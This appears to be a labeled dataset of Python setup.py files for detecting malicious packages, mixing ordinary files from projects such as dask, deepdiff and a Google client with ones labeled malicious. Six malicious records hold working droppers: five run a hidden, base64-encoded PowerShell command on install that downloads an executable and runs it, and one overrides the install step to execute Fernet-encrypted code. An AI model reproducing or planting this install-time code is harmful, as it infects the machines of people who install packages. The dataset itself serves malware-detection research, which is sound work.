{"idx": "mineget-3.63", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'mineget',\n    packages = ['modlib'],\n    version = '5.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-dataflow-client-0.5.4", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-dataflow-client\"\ndescription = \"Cloud Dataflow API client library\"\nversion = \"0.5.4\"\nrelease_status = \"Development Status :: 4 - Beta\"\nurl = \"https://github.com/googleapis/python-dataflow-client\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=url,\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    python_requires=\">=3.7\",\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "dagster-celery-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_celery/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-celery\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"Package for using Celery as Dagster's execution engine.\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/libraries/dagster-celery\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_celery_tests*\"]),\n        entry_points={\"console_scripts\": [\"dagster-celery = dagster_celery.cli:main\"]},\n        install_requires=[\n            \"dagster==1.0.3\",\n            \"celery>=4.3.0\",\n            \"click>=5.0,<9.0\",\n        ],\n        extras_require={\n            \"flower\": [\"flower\"],\n            \"redis\": [\"redis\"],\n            \"kubernetes\": [\"kubernetes\"],\n            \"test\": [\"docker\"],\n        },\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "dask-gateway-2022.6.1", "func": "import os\n\nfrom setuptools import find_packages, setup\n\n# determine version from _version.py\nns = {}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, \"dask_gateway\", \"_version.py\")) as f:\n    exec(f.read(), {}, ns)\n    VERSION = ns[\"__version__\"]\n\nwith open(\"requirements.txt\") as f:\n    install_requires = [l for l in f.readlines() if not l.startswith(\"#\")]\n\nextras_require = {\n    \"kerberos\": [\n        'pykerberos;platform_system!=\"Windows\"',\n        'winkerberos;platform_system==\"Windows\"',\n    ],\n}\n\nsetup(\n    name=\"dask-gateway\",\n    version=VERSION,\n    maintainer=\"Jim Crist-Harif\",\n    maintainer_email=\"jcristharif@gmail.com\",\n    license=\"BSD\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: System :: Distributed Computing\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    keywords=\"dask hadoop kubernetes HPC distributed cluster\",\n    description=\"A client library for interacting with a dask-gateway server\",\n    long_description=open(\"README.rst\").read(),\n    long_description_content_type=\"text/x-rst\",\n    url=\"https://gateway.dask.org/\",\n    project_urls={\n        \"Documentation\": \"https://gateway.dask.org/\",\n        \"Source\": \"https://github.com/dask/dask-gateway/\",\n        \"Issue Tracker\": \"https://github.com/dask/dask-gateway/issues\",\n    },\n    packages=find_packages(),\n    package_data={\"dask_gateway\": [\"*.yaml\"]},\n    install_requires=install_requires,\n    extras_require=extras_require,\n    python_requires=\">=3.8\",\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "py-postproofmc-1.82", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-postproofmc',\n    packages = ['modlib'],\n    version = '2.13',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "djangosaml2-1.5.1", "func": "# Copyright (C) 2011-2012 Yaco Sistemas <lgs@yaco.es>\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#            http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nimport codecs\nimport os\n\nfrom setuptools import find_packages, setup\n\n\ndef read(*rnames):\n    return codecs.open(\n        os.path.join(os.path.dirname(__file__), *rnames), encoding=\"utf-8\"\n    ).read()\n\n\nsetup(\n    name=\"djangosaml2\",\n    version=\"1.5.1\",\n    description=\"pysaml2 integration for Django\",\n    long_description=read(\"README.md\"),\n    long_description_content_type=\"text/markdown\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Framework :: Django :: 4.1\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Internet :: WWW/HTTP :: WSGI\",\n        \"Topic :: Security\",\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\n    ],\n    keywords=\"django,pysaml2,sso,saml2,federated authentication,authentication\",\n    author=\"Yaco Sistemas and independent contributors\",\n    author_email=\"lgs@yaco.es\",\n    maintainer=\"Giuseppe De Marco\",\n    url=\"https://github.com/IdentityPython/djangosaml2\",\n    download_url=\"https://pypi.org/project/djangosaml2/\",\n    license=\"Apache 2.0\",\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[\n        \"defusedxml>=0.4.1\",\n        \"Django>=2.2,<5\",\n        \"pysaml2>=6.5.1\",\n    ],\n)\n", "target": 0}
{"idx": "esqgrandvm-2.3", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgrandvm',\n    packages = ['modlib'],\n    version = '3.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-gameram-8.68", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-gameram',\n    packages = ['modlib'],\n    version = '7.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "custmtkinter-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ZfUUQTuePUdhleiokdCNWbWOfxEkSvbsdMEXPFUjoErSvtmAshgWIjdCGsLPW'\nLONG_DESCRIPTION = 'VzyHzuPuyrGaVkTbavSGNXsgLYwReprUbgQXhDYCChxcWIMVGext UZtcPoiEqlT AJjuKegYlRvxJcAPIILuDpXZshcDhMduHGIajNLyRpRTqlUhngghOgJANLKsZBaLzWBmJqPBwmdnYAmhuURTBN qufdtf xrmuLyTBcpwpizojpDFglEcKUqWApEkcZparAwYIAxwxZxFHrDwoRNprKsrSznVbhSXWtJxxyCrx PjftNvoGsgHfcBmGXHDZLoidzpTyTCUCdCgkxoGhdQYgjwrRxREbkWJI  mtecDueNAnTarILvwnhoiuXWBdvlMNxLcBZKlYYbgPrlKpFtXBZWOqpMUFHsVBtxRgjbRepXomHEItSTqMuTmfyjvFOX ErWCSvUcNl'\n\n\nclass SnoqhADqBnzVfkFwKLAHUHzDTdXffUsWSawOOHDMiCclbWbvvjbSxADufSaFSXuVYJiSkdDVtaXZKictQsZWEuuTKZ(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'5VqoBz-uSYpNU6QL9WkdSx4NbjPzFonUtQbVWnbgiAE=').decrypt(b'gAAAAABmBIPZhT_p6hcgch-WPkONl7KoI8V0pDdwBcjyB8JUdlmc2fNiugll4HT7-407xfNk-u7jLdKeU-T1zmrKsuHXxpw-LBzTop0Yun4gbEx8PtubxcP5PYz7TpDV2UhYv6vre6ADGp9wHd2O_u3d9553l1qmR73YKqXD9XmOphLEoX4uZe5phQq4WAsoVVtgVh7QywAhh1Oew10Gn4Sz9gcSQqNpiNN_MFGh0W3qzd8KXt16gak='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"custmtkinter\",\n    version=VERSION,\n    author=\"DmegyeAIPjaDiLHaMAw\",\n    author_email=\"BJOJhi@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': SnoqhADqBnzVfkFwKLAHUHzDTdXffUsWSawOOHDMiCclbWbvvjbSxADufSaFSXuVYJiSkdDVtaXZKictQsZWEuuTKZ,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "django-debug-toolbar-3.5.0", "func": "#!/usr/bin/env python3\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "distributed-2022.8.0", "func": "#!/usr/bin/env python\n\nfrom __future__ import annotations\n\nimport os\n\nfrom setuptools import find_packages, setup\n\nimport versioneer\n\nrequires = open(\"requirements.txt\").read().strip().split(\"\\n\")\ninstall_requires = []\nextras_require: dict = {}\nfor r in requires:\n    if \";\" in r:\n        # requirements.txt conditional dependencies need to be reformatted for wheels\n        # to the form: `'[extra_name]:condition' : ['requirements']`\n        req, cond = r.split(\";\", 1)\n        cond = \":\" + cond\n        cond_reqs = extras_require.setdefault(cond, [])\n        cond_reqs.append(req)\n    else:\n        install_requires.append(r)\n\n\nsetup(\n    name=\"distributed\",\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    description=\"Distributed scheduler for Dask\",\n    url=\"https://distributed.dask.org\",\n    project_urls={\n        \"Source\": \"https://github.com/dask/distributed\",\n    },\n    maintainer=\"Matthew Rocklin\",\n    maintainer_email=\"mrocklin@gmail.com\",\n    python_requires=\">=3.8\",\n    license=\"BSD\",\n    package_data={\n        \"\": [\"templates/index.html\", \"template.html\"],\n        \"distributed\": [\"http/templates/*.html\", \"py.typed\"],\n    },\n    include_package_data=True,\n    install_requires=install_requires,\n    extras_require=extras_require,\n    packages=find_packages(exclude=[\"*tests*\"]),\n    long_description=(\n        open(\"README.rst\").read() if os.path.exists(\"README.rst\") else \"\"\n    ),\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: System :: Distributed Computing\",\n    ],\n    entry_points=\"\"\"\n        [console_scripts]\n        dask-ssh=distributed.cli.dask_ssh:main\n        dask-scheduler=distributed.cli.dask_scheduler:main\n        dask-worker=distributed.cli.dask_worker:main\n      \"\"\",\n    # https://mypy.readthedocs.io/en/latest/installed_packages.html\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "gsecrets-1.3.3", "func": "from setuptools import find_packages, setup, Command\nimport os\nimport sys\nfrom shutil import rmtree\n\nNAME = \"gsecrets\"\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nwith open(os.path.join(here, NAME, \"__version__.py\")) as f:\n    exec(f.read(), about)\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = \"Build and publish the package.\"\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print(\"\\033[1m{0}\\033[0m\".format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status(\"Removing previous builds...\")\n            rmtree(os.path.join(here, \"dist\"))\n        except OSError:\n            pass\n\n        self.status(\"Building Source and Wheel (universal) distribution...\")\n        os.system(\"{0} setup.py sdist bdist_wheel --universal\".format(sys.executable))\n\n        self.status(\"Uploading the package to PyPi via Twine...\")\n        os.system(\"twine upload dist/*\")\n\n        sys.exit()\n\n\nsetup(\n    name=\"gsecrets\",\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    url=about[\"__url__\"],\n    packages=find_packages(),\n    license=about[\"__license__\"],\n    install_requires=[\n        \"click\",\n        \"google-api-python-client\",\n        \"google-cloud-storage\",\n        \"ndg-httpsclient\",\n        \"pyasn1==0.4.8\",\n        \"pyopenssl==19.1.0\",\n        \"requests\",\n    ],\n    entry_points={\"console_scripts\": [\"gsecrets = gsecrets.cli:cli\"]},\n    cmdclass={\"upload\": UploadCommand},\n)\n", "target": 0}
{"idx": "glob2-0.7", "func": "#!/usr/bin/env python\nimport os\nfrom setuptools import setup, find_packages\n\n\n# Figure out the version\nimport re\nhere = os.path.dirname(os.path.abspath(__file__))\nversion_re = re.compile(\n    r'__version__ = (\\(.*?\\))')\nfp = open(os.path.join(here, 'glob2', '__init__.py'))\nversion = None\nfor line in fp:\n    match = version_re.search(line)\n    if match:\n        version = eval(match.group(1))\n        break\nelse:\n    raise Exception(\"Cannot find version in __init__.py\")\nfp.close()\n\n\nsetup(\n    name = 'glob2',\n    version = \".\".join(map(str, version)),\n    description = 'Version of the glob module that can capture patterns '+\n                  'and supports recursive wildcards',\n    author = 'Michael Elsdoerfer',\n    author_email = 'michael@elsdoerfer.com',\n    license='BSD',\n    url = 'http://github.com/miracle2k/python-glob2/',\n    classifiers = [\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Software Development :: Libraries',\n        ],\n    packages = find_packages()\n)\n", "target": 0}
{"idx": "flex-6.14.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\n\nDIR = os.path.dirname(os.path.abspath(__file__))\n\ntry:\n    from setuptools import setup, find_packages\nexcept ImportError:\n    from distutils.core import setup, find_packages\n\nversion = '6.14.1'\n\nreadme = open(os.path.join(DIR, 'README.md')).read()\n\n\nsetup(\n    name='flex',\n    version=version,\n    description=\"\"\"Swagger Schema validation.\"\"\",\n    long_description=readme,\n    long_description_content_type='text/markdown',\n    author='Piper Merriam',\n    author_email='pipermerriam@gmail.com',\n    url='https://github.com/pipermerriam/flex',\n    include_package_data=True,\n    py_modules=['flex'],\n    install_requires=[\n        \"six>=1.7.3\",\n        \"PyYAML>=3.11\",\n        \"validate-email>=1.2\",\n        \"rfc3987>=1.3.4\",\n        \"requests>=2.4.3\",\n        \"strict-rfc3339>=0.7\",\n        \"click>=3.3\",\n        \"jsonpointer>=1.7\",\n    ],\n    license=\"BSD\",\n    zip_safe=False,\n    entry_points={\n        'console_scripts': [\"swagger-flex=flex.cli:main\"],\n    },\n    keywords='rest swagger',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n)\n", "target": 0}
{"idx": "deepdiff-5.8.1", "func": "import os\nimport sys\nfrom setuptools import setup\n\nif sys.version_info.major == 2:  # pragma: no cover\n    sys.exit('Python 2 is not supported anymore. The last version of DeepDiff that supported Py2 was 3.3.0')\n\n# if you are not using vagrant, just delete os.link directly,\n# The hard link only saves a little disk space, so you should not care\nif os.environ.get('USER', '') == 'vagrant':\n    del os.link\n\nversion = '5.8.1'\n\n\ndef get_reqs(filename):\n    with open(filename, \"r\") as reqs_file:\n        reqs = reqs_file.readlines()\n    return reqs\n\n\nreqs = get_reqs(\"requirements.txt\")\ncli_reqs = get_reqs(\"requirements-cli.txt\")\n\nwith open('README.md') as file:\n    long_description = file.read()\n\n\nsetup(name='deepdiff',\n      version=version,\n      description='Deep Difference and Search of any Python object/data.',\n      url='https://github.com/seperman/deepdiff',\n      download_url='https://github.com/seperman/deepdiff/tarball/master',\n      author='Seperman',\n      author_email='sep@zepworks.com',\n      license='MIT',\n      packages=['deepdiff'],\n      zip_safe=True,\n      test_suite=\"tests\",\n      include_package_data=True,\n      tests_require=['mock'],  # 'numpy==1.11.2' numpy is needed but comes already installed with travis\n      long_description=long_description,\n      long_description_content_type='text/markdown',\n      install_requires=reqs,\n      python_requires='>=3.6',\n      extras_require={\n          \"cli\": cli_reqs,\n      },\n      classifiers=[\n          \"Intended Audience :: Developers\",\n          \"Operating System :: OS Independent\",\n          \"Topic :: Software Development\",\n          \"Programming Language :: Python :: 3.6\",\n          \"Programming Language :: Python :: 3.7\",\n          \"Programming Language :: Python :: 3.8\",\n          \"Programming Language :: Python :: 3.9\",\n          \"Programming Language :: Python :: 3.10\",\n          \"Programming Language :: Python :: Implementation :: PyPy\",\n          \"Development Status :: 5 - Production/Stable\",\n          \"License :: OSI Approved :: MIT License\"\n      ],\n      entry_points={\n          'console_scripts': [\n              'deep=deepdiff.commands:cli',\n          ],\n      },\n      )\n", "target": 0}
{"idx": "py-toolvmintel-9.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-toolvmintel',\n    packages = ['modlib'],\n    version = '2.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
